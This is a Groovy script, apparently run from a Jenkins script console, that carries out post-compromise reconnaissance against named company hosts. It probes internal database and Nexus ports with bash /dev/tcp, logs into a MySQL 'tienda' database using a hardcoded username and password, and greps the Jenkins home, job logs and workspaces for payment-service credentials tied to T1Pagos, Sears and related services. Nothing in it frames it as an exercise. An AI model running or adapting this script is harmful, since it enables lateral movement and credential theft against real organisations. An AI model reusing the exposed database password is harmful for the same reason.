// MICRO-AJ: Test DB reachability via bash /dev/tcp + JDBC + read envinject for T1 creds
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(3000)
}

println "=== CONNECTIVITY TESTS VIA bash /dev/tcp ==="
def hosts = [
    ["appdb.claroshop-services.net", "3306"],
    ["dbps.claroshop-services.net",  "3310"],
    ["172.27.141.4",                  "3310"],
    ["172.27.141.24",                 "3308"],
    ["172.27.141.25",                 "8081"],  // Nexus
    ["172.27.141.25",                 "3306"],  // maybe DB on Nexus host
]
hosts.each { host, port ->
    def r = run("timeout 3 bash -c 'cat < /dev/null > /dev/tcp/${host}/${port}' 2>&1 && echo 'OPEN:${host}:${port}' || echo 'CLOSED:${host}:${port}'")
    println "  " + r.trim().take(80)
}

println "\n=== JDBC DIRECT CONNECTION TO TIENDA DB ==="
try {
    // Jenkins has MySQL JDBC driver? Let's try
    def props = new java.util.Properties()
    props.setProperty("user", "adaxxidb")
    props.setProperty("password", "JTQ6PrkecY3y1kVN")
    props.setProperty("connectTimeout", "5000")
    def conn = java.sql.DriverManager.getConnection(
        "jdbc:mysql://appdb.claroshop-services.net:3306/tienda",
        props
    )
    def stmt = conn.createStatement()
    def rs = stmt.executeQuery("SHOW TABLES LIMIT 20")
    def tables = []
    while (rs.next()) tables << rs.getString(1)
    conn.close()
    println "TIENDA DB CONNECTED! Tables: " + tables.join(", ")
} catch(e) {
    println "TIENDA DB FAIL: " + e.message?.take(200)
}

println "\n=== ENVINJECT: Look for T1Pagos USERVAR values in jobs ==="
// EnvInject plugin stores per-job env vars
def envinject = run("find /var/jenkins_home/jobs -name 'envinjectbuildcause*.log' -o -name 'injectedEnvVars.txt' -o -name 'build.xml' 2>/dev/null | xargs grep -l 'T1\\|t1\\|SEARS\\|sears\\|APIFINCA\\|mrc-service' 2>/dev/null | head -10")
println "Envinject files with T1/Sears: " + envinject.take(500)

// Look for EnvInject property files in job configs
def envPropFiles = run("find /var/jenkins_home/jobs -name '*.properties' -o -name 'env.properties' 2>/dev/null | head -20")
println "Properties files: " + envPropFiles.take(500)

println "\n=== SEARCH FOR T1 CREDS IN ENTIRE JENKINS HOME ==="
def bigGrep = run("grep -r 't1comercios\\|t1pagos\\|T1PAGOS\\|apifincadob\\|dbasears\\|mrc-services' /var/jenkins_home/ 2>/dev/null | grep -v Binary | grep -v '/.git/' | head -20")
println "Entire jenkins_home T1 grep: " + bigGrep.take(2000)

println "\n=== LOOK AT ACTIVE WORKSPACE: cs_msa_front ==="
def front = run("find /var/jenkins_home/workspace/cs_msa_front -maxdepth 3 -name '*.php' -o -name '.env*' -o -name '*.yml' 2>/dev/null | head -20")
println "cs_msa_front files: " + front.take(500)

println "=== DONE MICRO-AJ ==="
